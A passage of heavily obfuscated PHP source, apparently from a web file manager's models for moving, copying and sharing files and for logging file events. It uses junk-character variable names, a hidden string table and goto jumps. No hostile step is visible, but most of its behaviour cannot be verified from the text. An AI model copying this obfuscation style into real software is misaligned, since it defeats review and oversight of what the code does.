$¸ãß¦Ñ·[$Å‘ªªıî[592]]) { $this->removeNow($š¸ŸˆÊÇ, !1); } $this->lockMoveEnd($š¸ŸˆÊÇ); $this->lockWriteEnd($ª§ûµÌÊ, $Ëáßï); $this->folderSizeReset($ÔÌÅ®ø[$Å‘ªªıî[498]]); $this->folderSizeReset($ª§ûµÌÊ); $‰Ä¬Ü„ = array($ÔÌÅ®ø[$Å‘ªªıî[498]], $ª§ûµÌÊ); if ($ÔÌÅ®ø[$Å‘ªªıî[411]] == $Å‘ªªıî[99]) { $‰Ä¬Ü„[] = $š¸ŸˆÊÇ; } $this->updateModifyTime($‰Ä¬Ü„); Model($Å‘ªªıî[564])->eventMove($š¸ŸˆÊÇ, $ÔÌÅ®ø[$Å‘ªªıî[498]], $ª§ûµÌÊ); Hook::trigger($Å‘ªªıî[591], $¯¹èÄÃ¬); return $¾ú×ç¬; } private function _move($ùŠ²“ö, $Ş§­İ, $¶ÑÉŞÒÑ, &$«ÙÂØ³, $ù²…ºíÁ = '') { $±ä¦¶²ä =& $_SERVER[¹àö™Ç¾]; $ËÙ¿ß« = $this->sourceInfo($ùŠ²“ö); $«Íİ¶İ = $ËÙ¿ß«[$±ä¦¶²ä[411]] == $±ä¦¶²ä[99]; $ ú’¯¡€ = $ù²…ºíÁ ? $ù²…ºíÁ : $ËÙ¿ß«[$±ä¦¶²ä[42]]; $‰¥ş·»ş = $this->fileNameExistCache($Ş§­İ, $ ú’¯¡€); $this->lockMoveStart($ùŠ²“ö); $this->lockWriteStart($Ş§­İ, $ ú’¯¡€); if (!$‰¥ş·»ş) { return $this->_moveForce($ùŠ²“ö, $Ş§­İ, $ ú’¯¡€); } $ğääï”Í = $‰¥ş·»ş; $¥øôà´‡ = !1; if ($«Íİ¶İ) { if ($¶ÑÉŞÒÑ == REPEAT_RENAME_FOLDER) { $ ú’¯¡€ = $this->fileNameAuto($Ş§­İ, $ ú’¯¡€, $¶ÑÉŞÒÑ, $«Íİ¶İ); $ğääï”Í = $this->_moveForce($ùŠ²“ö, $Ş§­İ, $ ú’¯¡€); } else { if ($¶ÑÉŞÒÑ == REPEAT_RENAME_FOLDER) { $¶ÑÉŞÒÑ = REPEAT_RENAME; } $Ñø¢áõ® = $this->_childrenListSelect($ùŠ²“ö); foreach ($Ñø¢áõ® as $®Ş´¬®ò) { $this->_move($®Ş´¬®ò[$±ä¦¶²ä[403]], $‰¥ş·»ş, $¶ÑÉŞÒÑ, $«ÙÂØ³); } $¥øôà´‡ = !0; } } else { if ($¶ÑÉŞÒÑ == REPEAT_SKIP) { $¥øôà´‡ = !0; } else { if ($¶ÑÉŞÒÑ == REPEAT_RENAME || $¶ÑÉŞÒÑ == REPEAT_RENAME_FOLDER) { $ ú’¯¡€ = $this->fileNameAuto($Ş§­İ, $ ú’¯¡€, $¶ÑÉŞÒÑ, $«Íİ¶İ); $ğääï”Í = $this->_moveForce($ùŠ²“ö, $Ş§­İ, $ ú’¯¡€); } else { if ($¶ÑÉŞÒÑ == REPEAT_REPLACE) { $Ëğ±îİ³ = $this->sourceInfoCache($‰¥ş·»ş); $•ë¼…ÙÏ = $this->fileHistory($Ëğ±îİ³, $ËÙ¿ß«[$±ä¦¶²ä[467]], $ËÙ¿ß«[$±ä¦¶²ä[90]]); $¥øôà´‡ = !0; if ($•ë¼…ÙÏ) { $«ÙÂØ³[$±ä¦¶²ä[560]][] = $ËÙ¿ß«[$±ä¦¶²ä[467]]; } } } } } if ($¥øôà´‡ && !$«ÙÂØ³[$±ä¦¶²ä[592]]) { $«ÙÂØ³[$±ä¦¶²ä[592]] = !0; } return $ğääï”Í; } private function _moveForce($¹„¥çøÎ, $ËŒ¬¢Ó, $éÑç¬Êû) { $ŠÄ°ıÆ =& $_SERVER[¹àö™Ç¾]; $äŞ£¦ÇÑ = $this->sourceInfo($¹„¥çøÎ); $çÔ¦ ¤¥ = $this->sourceInfo($ËŒ¬¢Ó); $Æ—áìÔ“ = $äŞ£¦ÇÑ[$ŠÄ°ıÆ[411]] == $ŠÄ°ıÆ[99]; $Àä¿Şè = array($ŠÄ°ıÆ[402] => $çÔ¦ ¤¥[$ŠÄ°ıÆ[403]], $ŠÄ°ıÆ[584] => $çÔ¦ ¤¥[$ŠÄ°ıÆ[521]] . $çÔ¦ ¤¥[$ŠÄ°ıÆ[403]] . $ŠÄ°ıÆ[60], $ŠÄ°ıÆ[580] => $çÔ¦ ¤¥[$ŠÄ°ıÆ[412]], $ŠÄ°ıÆ[581] => $çÔ¦ ¤¥[$ŠÄ°ıÆ[504]], $ŠÄ°ıÆ[583] => USER_ID, $ŠÄ°ıÆ[421] => $éÑç¬Êû); $‘ü™óÛ = $äŞ£¦ÇÑ[$ŠÄ°ıÆ[412]] == SourceModel::TYPE_GROUP && $çÔ¦ ¤¥[$ŠÄ°ıÆ[412]] == SourceModel::TYPE_GROUP && $äŞ£¦ÇÑ[$ŠÄ°ıÆ[504]] == $çÔ¦ ¤¥[$ŠÄ°ıÆ[504]]; if (!$‘ü™óÛ && $this->moveClearAuth) { Model($ŠÄ°ıÆ[502])->authClear($¹„¥çøÎ); } $Äã€Şí· = $äŞ£¦ÇÑ[$ŠÄ°ıÆ[431]] == $ŠÄ°ıÆ[99] && $çÔ¦ ¤¥[$ŠÄ°ıÆ[431]] != $ŠÄ°ıÆ[99]; if ($Äã€Şí·) { $Àä¿Şè[$ŠÄ°ıÆ[430]] = 0; } if ($Æ—áìÔ“) { $‚Û«†â = array($ŠÄ°ıÆ[584] => array($ŠÄ°ıÆ[544], $äŞ£¦ÇÑ[$ŠÄ°ıÆ[521]] . $äŞ£¦ÇÑ[$ŠÄ°ıÆ[403]] . $ŠÄ°ıÆ[545])); $ØÒï§“’ = $äŞ£¦ÇÑ[$ŠÄ°ıÆ[521]] . $äŞ£¦ÇÑ[$ŠÄ°ıÆ[403]] . $ŠÄ°ıÆ[60]; $’ÂËµé‚ = $çÔ¦ ¤¥[$ŠÄ°ıÆ[521]] . $çÔ¦ ¤¥[$ŠÄ°ıÆ[403]] . $ŠÄ°ıÆ[60] . $äŞ£¦ÇÑ[$ŠÄ°ıÆ[403]] . $ŠÄ°ıÆ[60]; $¢¾ÌÉà¼ = array($ŠÄ°ıÆ[584] => array($ŠÄ°ıÆ[593], "\162\145\160\154\x61\143\145\50\x70\141\162\145\x6e\164\114\x65\166\x65\154\x2c\47{$ØÒï§“’}\47\x2c\47{$’ÂËµé‚}\x27\51"), $ŠÄ°ıÆ[580] => $çÔ¦ ¤¥[$ŠÄ°ıÆ[412]], $ŠÄ°ıÆ[581] => $çÔ¦ ¤¥[$ŠÄ°ıÆ[504]]); if ($Äã€Şí·) { $¢¾ÌÉà¼[$ŠÄ°ıÆ[430]] = 0; } $this->where($‚Û«†â)->data($¢¾ÌÉà¼)->save(); } $this->where(array($ŠÄ°ıÆ[418] => $¹„¥çøÎ))->data($Àä¿Şè)->save(); return $¹„¥çøÎ; } private function clearShare($ªéÏééÜ, $äÏ¡¾•Ú) { $’æ„·¿ =& $_SERVER[¹àö™Ç¾]; $¶şİ‚«ö = $this->sourceInfo($ªéÏééÜ); $åƒ®’úÇ = $this->sourceInfo($äÏ¡¾•Ú); if ($¶şİ‚«ö[$’æ„·¿[504]] == $åƒ®’úÇ[$’æ„·¿[504]] && $¶şİ‚«ö[$’æ„·¿[412]] == $’æ„·¿[594]) { return; } $ÍáŸ¨· = array($’æ„·¿[521] => array($’æ„·¿[544], $¶şİ‚«ö[$’æ„·¿[521]] . $ªéÏééÜ . $’æ„·¿[545])); $™ùİ›± = $this->field($’æ„·¿[418])->where($ÍáŸ¨·)->getField($’æ„·¿[403], !0); if (!$™ùİ›±) { return; } $ÍáŸ¨· = array($’æ„·¿[403] => array($’æ„·¿[17], $™ùİ›±), $’æ„·¿[495] => 1); $¦Ôüæµ­ = Model($’æ„·¿[595])->field($’æ„·¿[488])->where($ÍáŸ¨·)->select(); if (!$¦Ôüæµ­) { return; } $¦Ôüæµ­ = array_to_keyvalue($¦Ôüæµ­, $’æ„·¿[22], $’æ„·¿[488]); $ÍáŸ¨· = array($’æ„·¿[488] => array($’æ„·¿[17], $¦Ôüæµ­)); Model($’æ„·¿[595])->where($ÍáŸ¨·)->save(array($’æ„·¿[495] => 0)); Model($’æ„·¿[596])->where($ÍáŸ¨·)->delete(); } public function copyFolderFromIO($ —âÏ¿°, $ºó×şÈ€, $ˆ–ğÆÖú, $¡ë“œÎ, $˜£Å¸•Â, $ôÄâàºš = false) { $òÊÌìá‰ =& $_SERVER[¹àö™Ç¾]; $ÜŒ€ş«ò = array($òÊÌìá‰[561] => array(), $òÊÌìá‰[562] => array(), $òÊÌìá‰[560] => array(), $òÊÌìá‰[597] => array()); $ö¸«µ‘Ò = $ôÄâàºš ? $ôÄâàºš : $ —âÏ¿°->pathThis($ºó×şÈ€); $¡½÷œœŠ = $this->fileNameExist($ˆ–ğÆÖú, $ö¸«µ‘Ò); $Ë•Š’¹Ç = $this->mkdir($ˆ–ğÆÖú, $ö¸«µ‘Ò, $¡ë“œÎ); if (!$¡½÷œœŠ || $¡ë“œÎ == REPEAT_RENAME_FOLDER) { $¡ë“œÎ = !1; } if ($¡½÷œœŠ) { $this->_childrenAllMake($¡½÷œœŠ); } Hook::trigger($òÊÌìá‰[598]); $this->_copyChildTo($ —âÏ¿°, $ºó×şÈ€, $Ë•Š’¹Ç, $¡ë“œÎ, $ÜŒ€ş«ò, $˜£Å¸•Â); Hook::trigger($òÊÌìá‰[599]); if ($Ë•Š’¹Ç) { $this->folderSizeResetChildren($Ë•Š’¹Ç); } $this->_childrenListClear(); Model($òÊÌìá‰[563])->addAll($ÜŒ€ş«ò[$òÊÌìá‰[561]], array(), !0); Model($òÊÌìá‰[564])->eventCopy($Ë•Š’¹Ç); $this->saveAll($ÜŒ€ş«ò[$òÊÌìá‰[562]]); Model($òÊÌìá‰[470])->linkAdd($ÜŒ€ş«ò[$òÊÌìá‰[560]]); Model($òÊÌìá‰[470])->remove($ÜŒ€ş«ò[$òÊÌìá‰[597]]); $this->folderSizeReset($ˆ–ğÆÖú); $this->updateModifyTime($ˆ–ğÆÖú); return $Ë•Š’¹Ç; } private function _copyChildTo($’Üã†§í, $×¶î¡®Ñ, $ãÈòÌ¥œ, $ó¢›®ÑÎ, &$¸‰Ûû¾¢, $‡¿‡¼Ó¶) { $ŞæÜêùƒ =& $_SERVER[¹àö™Ç¾]; $òîô®ò¾ = $this->sourceInfoCache($ãÈòÌ¥œ); $¬½Â­éÑ = $’Üã†§í->listPath($×¶î¡®Ñ); $¬½Â­éÑ = $¬½Â­éÑ ? $¬½Â­éÑ : array($ŞæÜêùƒ[86] => array(), $ŞæÜêùƒ[87] => array()); $©Ğá¹¦ş = array_merge($¬½Â­éÑ[$ŞæÜêùƒ[86]], $¬½Â­éÑ[$ŞæÜêùƒ[87]]); $ƒ¼óù = $this->_addFiles($’Üã†§í, $¬½Â­éÑ[$ŞæÜêùƒ[86]], $‡¿‡¼Ó¶); $µÙ§›‰ = array(); foreach ($©Ğá¹¦ş as &$çÎ°á÷Ò) { if (isset($ƒ¼óù[$çÎ°á÷Ò[$ŞæÜêùƒ[42]]])) { $çÎ°á÷Ò = $ƒ¼óù[$çÎ°á÷Ò[$ŞæÜêùƒ[42]]]; } $çÎ°á÷Ò[$ŞæÜêùƒ[411]] = $çÎ°á÷Ò[$ŞæÜêùƒ[43]] == $ŞæÜêùƒ[89]; $çÎ°á÷Ò[$ŞæÜêùƒ[413]] = _get($çÎ°á÷Ò, $ŞæÜêùƒ[177], $ŞæÜêùƒ[22]); $çÎ°á÷Ò[$ŞæÜêùƒ[90]] = _get($çÎ°á÷Ò, $ŞæÜêùƒ[90], 0); $çÎ°á÷Ò[$ŞæÜêùƒ[467]] = _get($çÎ°á÷Ò, $ŞæÜêùƒ[467], 0); if (!isset($çÎ°á÷Ò[$ŞæÜêùƒ[600]]) && $çÎ°á÷Ò[$ŞæÜêùƒ[467]]) { $¸‰Ûû¾¢[$ŞæÜêùƒ[597]][] = $çÎ°á÷Ò[$ŞæÜêùƒ[467]]; } if ($ó¢›®ÑÎ) { $¤ÉÃß§Ú = $this->fileNameExistCache($ãÈòÌ¥œ, $çÎ°á÷Ò[$ŞæÜêùƒ[42]]); if ($¤ÉÃß§Ú) { if ($çÎ°á÷Ò[$ŞæÜêùƒ[411]] || $ó¢›®ÑÎ == REPEAT_SKIP) { continue; } if ($ó¢›®ÑÎ == REPEAT_REPLACE) { $Úè àå = $this->sourceInfoCache($¤ÉÃß§Ú); $áÂÏš²­ = $this->fileHistory($Úè àå, $çÎ°á÷Ò[$ŞæÜêùƒ[467]], $çÎ°á÷Ò[$ŞæÜêùƒ[90]]); if ($áÂÏš²­) { $¸‰Ûû¾¢[$ŞæÜêùƒ[560]][] = $çÎ°á÷Ò[$ŞæÜêùƒ[467]]; } continue; } else { if ($ó¢›®ÑÎ == REPEAT_RENAME) { $çÎ°á÷Ò[$ŞæÜêùƒ[42]] = $this->fileNameAutoCache($ãÈòÌ¥œ, $çÎ°á÷Ò[$ŞæÜêùƒ[42]], $ó¢›®ÑÎ, !1); } } } } if (!$çÎ°á÷Ò[$ŞæÜêùƒ[411]] && $çÎ°á÷Ò[$ŞæÜêùƒ[467]] == 0) { continue; } if (!$çÎ°á÷Ò[$ŞæÜêùƒ[411]] && $çÎ°á÷Ò[$ŞæÜêùƒ[467]]) { $¸‰Ûû¾¢[$ŞæÜêùƒ[560]][] = $çÎ°á÷Ò[$ŞæÜêùƒ[467]]; } $µÙ§›‰[] = $this->_makeItemData($çÎ°á÷Ò, $òîô®ò¾, $çÎ°á÷Ò[$ŞæÜêùƒ[42]]); } unset($çÎ°á÷Ò); if (!empty($µÙ§›‰)) { $this->addAll($µÙ§›‰); $this->_childrenListSelect($ãÈòÌ¥œ); } $çİÙİ´© = $this->_childrenList($ãÈòÌ¥œ); $çİÙİ´© = array_to_keyvalue($çİÙİ´©, $ŞæÜêùƒ[42]); foreach ($©Ğá¹¦ş as $çÎ°á÷Ò) { $Úè àå = $çİÙİ´©[$çÎ°á÷Ò[$ŞæÜêùƒ[42]]]; $ÄßïŒ«† = $Úè àå[$ŞæÜêùƒ[403]]; $this->_copyApplyMeta($Úè àå, $¸‰Ûû¾¢); if ($çÎ°á÷Ò[$ŞæÜêùƒ[43]] == $ŞæÜêùƒ[89]) { $çÎ°á÷Ò[$ŞæÜêùƒ[88]] = $’Üã†§í->getPathInner($çÎ°á÷Ò[$ŞæÜêùƒ[88]]); $this->_copyChildTo($’Üã†§í, $çÎ°á÷Ò[$ŞæÜêùƒ[88]], $ÄßïŒ«†, $ó¢›®ÑÎ, $¸‰Ûû¾¢, $‡¿‡¼Ó¶); } } } private function _addFiles($ÛÌêø³ƒ, $‡ù¯ı, $ššıÒ×‹) { $•øû¡èê =& $_SERVER[¹àö™Ç¾]; if (!$‡ù¯ı || count($‡ù¯ı) == 0) { return array(); } $åšşó¢ = array(); foreach ($‡ù¯ı as &$úŸµßá) { Hook::trigger($•øû¡èê[601], $úŸµßá); $úŸµßá[$•øû¡èê[88]] = $ÛÌêø³ƒ->getPathInner($úŸµßá[$•øû¡èê[88]]); $›ÉªÆãç = $ÛÌêø³ƒ->hashSimple($úŸµßá[$•øû¡èê[88]]); $ˆ¨ü¶Óş = $ÛÌêø³ƒ->hashMd5($úŸµßá[$•øû¡èê[88]]); if (strlen($ˆ¨ü¶Óş) > 10 && !isset($åšşó¢[$ˆ¨ü¶Óş])) { $åšşó¢[$ˆ¨ü¶Óş] = array(); } $úŸµßá[$•øû¡èê[180]] = $›ÉªÆãç; $úŸµßá[$•øû¡èê[179]] = $ˆ¨ü¶Óş; Hook::trigger($•øû¡èê[602], $úŸµßá); $åšşó¢[$ˆ¨ü¶Óş][] =& $úŸµßá; if (count($åšşó¢[$ˆ¨ü¶Óş]) > 1) { $úŸµßá[$•øû¡èê[600]] = !0; } } unset($úŸµßá); $ÖÏ…üô = array($•øû¡èê[179] => array($•øû¡èê[17], array_keys($åšşó¢))); $†Ø³±„² = Model($•øû¡èê[603]); $¼£‰±«§ = $†Ø³±„²->where($ÖÏ…üô)->select(); $¼£‰±«§ = $¼£‰±«§ ? $¼£‰±«§ : array(); foreach ($¼£‰±«§ as $ûô¶…öÕ) { if (!isset($åšşó¢[$ûô¶…öÕ[$•øû¡èê[179]]])) { continue; } $É†§®ú¨ = $åšşó¢[$ûô¶…öÕ[$•øû¡èê[179]]]; foreach ($É†§®ú¨ as &$úŸµßá) { $úŸµßá[$•øû¡èê[467]] = $ûô¶…öÕ[$•øû¡èê[467]]; $úŸµßá[$•øû¡èê[600]] = !0; } unset($úŸµßá); } $¢úŞ¾†‚ = array(); foreach ($‡ù¯ı as $œ×õÈ…„) { if (isset($œ×õÈ…„[$•øû¡èê[600]]) && $œ×õÈ…„[$•øû¡èê[600]]) { continue; } $ÄğÂÃ¸ = $ÛÌêø³ƒ->getPathInner($œ×õÈ…„[$•øû¡èê[88]]); $–ô¡á•Ä = $†Ø³±„²->addFileMake($ÄğÂÃ¸, $œ×õÈ…„[$•øû¡èê[90]], $œ×õÈ…„[$•øû¡èê[180]], $œ×õÈ…„[$•øû¡èê[179]], $œ×õÈ…„[$•øû¡èê[42]], $ššıÒ×‹); if (!is_array($–ô¡á•Ä)) { continue; } $¢úŞ¾†‚[] = $–ô¡á•Ä; } $†Ø³±„²->addAll($¢úŞ¾†‚); $ÖÏ…üô = array($•øû¡èê[179] => array($•øû¡èê[17], array_keys($åšşó¢))); $¼£‰±«§ = $†Ø³±„²->where($ÖÏ…üô)->select(); $¼£‰±«§ = $¼£‰±«§ ? $¼£‰±«§ : array(); foreach ($¼£‰±«§ as $ûô¶…öÕ) { if (!isset($åšşó¢[$ûô¶…öÕ[$•øû¡èê[179]]])) { continue; } $È´‘‘ Ö =& $åšşó¢[$ûô¶…öÕ[$•øû¡èê[179]]]; foreach ($È´‘‘ Ö as &$úŸµßá) { $úŸµßá[$•øû¡èê[467]] = $ûô¶…öÕ[$•øû¡èê[467]]; } unset($úŸµßá); } $ùŞ“…äŸ = array(); foreach ($‡ù¯ı as $ª˜¶Õµ) { $ùŞ“…äŸ[$ª˜¶Õµ[$•øû¡èê[42]]] = $ª˜¶Õµ; } return $ùŞ“…äŸ; } } define($_SERVER[¹àö™Ç¾][604], $_SERVER[¹àö™Ç¾][605]); $txwqmaycik = $_SERVER[¹àö™Ç¾][606]; goto e¼Õ‰í®µÚ; dËâŸŒîµÆ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\143\x65\x5f\145\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\151\x6d\x65", "\x74\151\155\145", "\151\x6e\163\145\x72\164", "\x66\x75\x6e\143\164\151\x6f\156"), array("\144\x65\163\143", '', "\151\156\163\145\x72\164\x2c\165\x70\x64\141\164\x65\54\x73\145\x6c\x65\143\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ˆ³¥Ò“Ø, $éüóÜ÷, $şÕ€ÓôÇ = '') { $’¼çÎ¶ñ =& $_SERVER[¹àö™Ç¾]; if (!$this->eventSave) { return; } $²¯’é© = Model($’¼çÎ¶ñ[1310])->sourceInfo($ˆ³¥Ò“Ø); if (!$²¯’é©) { return !1; } if ($this->isCacheEvent($²¯’é©, $éüóÜ÷)) { return; } if ($şÕ€ÓôÇ && is_string($şÕ€ÓôÇ)) { $şÕ€ÓôÇ = array($’¼çÎ¶ñ[1846] => $şÕ€ÓôÇ); } $ ‰º·ö = array($’¼çÎ¶ñ[418] => $ˆ³¥Ò“Ø, $’¼çÎ¶ñ[2020] => $²¯’é©[$’¼çÎ¶ñ[498]], $’¼çÎ¶ñ[2021] => $²¯’é©[$’¼çÎ¶ñ[42]], $’¼çÎ¶ñ[519] => !empty($²¯’é©[$’¼çÎ¶ñ[519]]) ? $²¯’é©[$’¼çÎ¶ñ[519]] : $’¼çÎ¶ñ[22], $’¼çÎ¶ñ[1631] => USER_ID, $’¼çÎ¶ñ[423] => $éüóÜ÷, $’¼çÎ¶ñ[1633] => $şÕ€ÓôÇ); $this->addSystemLog($éüóÜ÷, $ ‰º·ö); unset($ ‰º·ö[$’¼çÎ¶ñ[2021]], $ ‰º·ö[$’¼çÎ¶ñ[519]]); return $this->add($ ‰º·ö); } private function addSystemLog($É¨×¸ÓË, $Ğ»€ÕÉè) { $Â¿¡•ş =& $_SERVER[¹àö™Ç¾]; if ($É¨×¸ÓË == $Â¿¡•ş[2022]) { $É¨×¸ÓË = $Ğ»€ÕÉè[$Â¿¡•ş[451]][$Â¿¡•ş[2023]]; } else { if (in_array($É¨×¸ÓË, array($Â¿¡•ş[1788], $Â¿¡•ş[2024]))) { $É¨×¸ÓË = $Ğ»€ÕÉè[$Â¿¡•ş[451]][$Â¿¡•ş[747]]; } } $¨ÖíåÓ© = array_merge($Ğ»€ÕÉè, array($Â¿¡•ş[2025] => $Ğ»€ÕÉè[$Â¿¡•ş[403]], $Â¿¡•ş[2026] => $Ğ»€ÕÉè[$Â¿¡•ş[2026]])); Hook::trigger($Â¿¡•ş[2027], $Â¿¡•ş[2028] . $É¨×¸ÓË, $Ğ»€ÕÉè); Model($Â¿¡•ş[1752])->addLog($Â¿¡•ş[2028] . $É¨×¸ÓË, $¨ÖíåÓ©); } private function isCacheEvent($±ŠíÌÒæ, $ë™º¯„­) { if ($±ŠíÌÒæ[$_SERVER[¹àö™Ç¾][412]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($…º¾Òšˆ, $”¼é±ÓÍ) { $ÉÎÏëÍÀ =& $_SERVER[¹àö™Ç¾]; $ˆ¢Ö­‡È = Model($ÉÎÏëÍÀ[1310])->sourceInfo($…º¾Òšˆ); $·ü·Š¸ô = array($ÉÎÏëÍÀ[2023] => $”¼é±ÓÍ, $ÉÎÏëÍÀ[42] => $ˆ¢Ö­‡È[$ÉÎÏëÍÀ[42]]); return $this->addEvent($…º¾Òšˆ, $ÉÎÏëÍÀ[2022], $·ü·Š¸ô); } public function eventFileEdit($Åëòø•„) { $ßªºó£® =& $_SERVER[¹àö™Ç¾]; $µ®ºÒÇ = array($ßªºó£®[2029] => $_SERVER[$ßªºó£®[2030]], $ßªºó£®[2031] => strtolower(ACTION)); return $this->addEvent($Åëòø•„, $ßªºó£®[1778], $µ®ºÒÇ); } public function eventRecycle($éô€ç×Ù, $ƒ„‹ˆª®) { return $this->addEvent($éô€ç×Ù, $_SERVER[¹àö™Ç¾][2024], $ƒ„‹ˆª®); } public function eventRemove($Ò¡—§à) { $…ğÚ«Ä€ =& $_SERVER[¹àö™Ç¾]; $­®¯ë«Õ = Model($…ğÚ«Ä€[1310])->sourceInfo($Ò¡—§à); $áÅ›şÏì = $­®¯ë«Õ[$…ğÚ«Ä€[42]]; return $this->addEvent($­®¯ë«Õ[$…ğÚ«Ä€[498]], $…ğÚ«Ä€[1777], $áÅ›şÏì); } public function eventShare($±½ˆÙ‚ø, $è×ºªÁğ) { return $this->addEvent($±½ˆÙ‚ø, $_SERVER[¹àö™Ç¾][1788], $è×ºªÁğ); } public function eventMove($¸›´¶‚, $£§ğÉºÑ, $«ü˜©‡¯) { $úÊõê ¼ =& $_SERVER[¹àö™Ç¾]; $š¾³Šô = Model($úÊõê ¼[1310]); $ÙÀÕ†« = $š¾³Šô->sourceInfo($¸›´¶‚); $ŸÉãŞ÷ = $š¾³Šô->sourceInfo($£§ğÉºÑ); $¬Õ€½ë = $š¾³Šô->sourceInfo($«ü˜©‡¯); $Õ©µÎÂ¡ = array($úÊõê ¼[1143] => $£§ğÉºÑ, $úÊõê ¼[2032] => $ŸÉãŞ÷[$úÊõê ¼[42]], $úÊõê ¼[2011] => !empty($ŸÉãŞ÷[$úÊõê ¼[519]]) ? $ŸÉãŞ÷[$úÊõê ¼[519]] : $úÊõê ¼[22], $úÊõê ¼[1144] => $«ü˜©‡¯, $úÊõê ¼[2033] => $¬Õ€½ë[$úÊõê ¼[42]], $úÊõê ¼[2034] => !empty($¬Õ€½ë[$úÊõê ¼[519]]) ? $¬Õ€½ë[$úÊõê ¼[519]] : $úÊõê ¼[22]); $this->addEvent($¸›´¶‚, $úÊõê ¼[551], $Õ©µÎÂ¡); $ÙÀÕ†« = $š¾³Šô->sourceInfo($¸›´¶‚); $Õ©µÎÂ¡ = array($úÊõê ¼[403] => $ÙÀÕ†«[$úÊõê ¼[403]], $úÊõê ¼[42] => $ÙÀÕ†«[$úÊõê ¼[42]]); $this->addEvent($£§ğÉºÑ, $úÊõê ¼[2035], $Õ©µÎÂ¡); } public function eventCopy($‰¬ÆÍ¤Ó) { $this->eventCreate($‰¬ÆÍ¤Ó, $_SERVER[¹àö™Ç¾][549]); } public function eventRename($·ëËÊı…, $›¶¥Æñ˜, $şš²Ã„˜) { $Ìè›¿Ù =& $_SERVER[¹àö™Ç¾]; $·ºò‘ğ = array($Ìè›¿Ù[1143] => $›¶¥Æñ˜, $Ìè›¿Ù[1144] => $şš²Ã„˜); return $this->addEvent($·ëËÊı…, $Ìè›¿Ù[1325], $·ºò‘ğ); } public function eventAddComment($©ø ø–ù, $ÑÀÇ»Ÿ) { return $this->addEvent($©ø ø–ù, $_SERVER[¹àö™Ç¾][2036], $ÑÀÇ»Ÿ); } public function eventAddDesc($Š­§ëÇ, $ØŠÃ‹‚É) { return $this->addEvent($Š­§ëÇ, $_SERVER[¹àö™Ç¾][2037], $ØŠÃ‹‚É); } public function listBySource($Ó£ÅÒ…£) { $¥¤‰Ö»¬ =& $_SERVER[¹àö™Ç¾]; $­­’Èê³ = Model($¥¤‰Ö»¬[1310])->sourceInfo($Ó£ÅÒ…£); $‰š‰‘¦ã = array($¥¤‰Ö»¬[418] => $Ó£ÅÒ…£); if ($­­’Èê³[$¥¤‰Ö»¬[411]] == $¥¤‰Ö»¬[99]) { $—™Ü–½ = Model($¥¤‰Ö»¬[1310])->listSearchChildren($Ó£ÅÒ…£, 20000); $—™Ü–½[] = $Ó£ÅÒ…£ . $¥¤‰Ö»¬[382]; $‰š‰‘¦ã = array($¥¤‰Ö»¬[403] => array($¥¤‰Ö»¬[17], $—™Ü–½)); } $ƒù¿³© = $this->where($‰š‰‘¦ã)->order($¥¤‰Ö»¬[2038])->selectPage(); if ($ƒù¿³©[$¥¤‰Ö»¬[370]][$¥¤‰Ö»¬[371]] == 0) { $ƒù¿³©[$¥¤‰Ö»¬[370]][$¥¤‰Ö»¬[371]] = 1; $ƒù¿³©[$¥¤‰Ö»¬[373]] = array(array($¥¤‰Ö»¬[418] => $Ó£ÅÒ…£, $¥¤‰Ö»¬[2020] => $­­’Èê³[$¥¤‰Ö»¬[498]], $¥¤‰Ö»¬[1631] => $­­’Èê³[$¥¤‰Ö»¬[452]], $¥¤‰Ö»¬[423] => $¥¤‰Ö»¬[2039], $¥¤‰Ö»¬[424] => $­­’Èê³[$¥¤‰Ö»¬[203]], $¥¤‰Ö»¬[1633] => $¥¤‰Ö»¬[22])); } return $this->eventListParse($ƒù¿³©, $Ó£ÅÒ…£); } private function eventListParse($³¹™Ê˜Ë, $¸˜£½ä“) { $¼Í¤âş¸ =& $_SERVER[¹àö™Ç¾]; $ã›ŒÉü = $³¹™Ê˜Ë[$¼Í¤âş¸[373]]; $‘û»……˜ = array_to_keyvalue($ã›ŒÉü, $¼Í¤âş¸[22], $¼Í¤âş¸[403]); $Êë¿Ì§÷ = array_to_keyvalue($ã›ŒÉü, $¼Í¤âş¸[22], $¼Í¤âş¸[2026]); foreach ($ã›ŒÉü as $Â‚“©ÖÜ) { $ÛĞ ²úñ = $Â‚“©ÖÜ[$¼Í¤âş¸[451]]; if ($Â‚“©ÖÜ[$¼Í¤âş¸[43]] == $¼Í¤âş¸[551] && isset($ÛĞ ²úñ[$¼Í¤âş¸[1143]])) { $‘û»……˜[] = $ÛĞ ²úñ[$¼Í¤âş¸[1143]] . $¼Í¤âş¸[22]; $‘û»……˜[] = $ÛĞ ²úñ[$¼Í¤âş¸[1144]] . $¼Í¤âş¸[22]; } if ($Â‚“©ÖÜ[$¼Í¤âş¸[43]] == $¼Í¤âş¸[2035] && isset($ÛĞ ²úñ[$¼Í¤âş¸[403]])) { $‘û»……˜[] = $ÛĞ ²úñ[$¼Í¤âş¸[403]] . $¼Í¤âş¸[22]; } } $‘û»……˜ = array_merge($‘û»……˜, $Êë¿Ì§÷, array($¸˜£½ä“ . $¼Í¤âş¸[22])); $‘û»……˜ = array_unique($‘û»……˜); $¯âêî« = array_unique(array_to_keyvalue($ã›ŒÉü, $¼Í¤âş¸[22], $¼Í¤âş¸[1640])); $òÚÌÌÙ = Model($¼Í¤âş¸[538])->userListInfo($¯âêî«); $„¡—ë = Model($¼Í¤âş¸[817])->sourceListInfo($‘û»……˜, !0); foreach ($ã›ŒÉü as &$Â‚“©ÖÜ) { if ($Â‚“©ÖÜ[$¼Í¤âş¸[43]] == $¼Í¤âş¸[551] && isset($Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[1143]])) { $Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[1143]] = $„¡—ë[$Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[1143]]]; $Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[1144]] = $„¡—ë[$Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[1144]]]; } if ($Â‚“©ÖÜ[$¼Í¤âş¸[43]] == $¼Í¤âş¸[2035] && 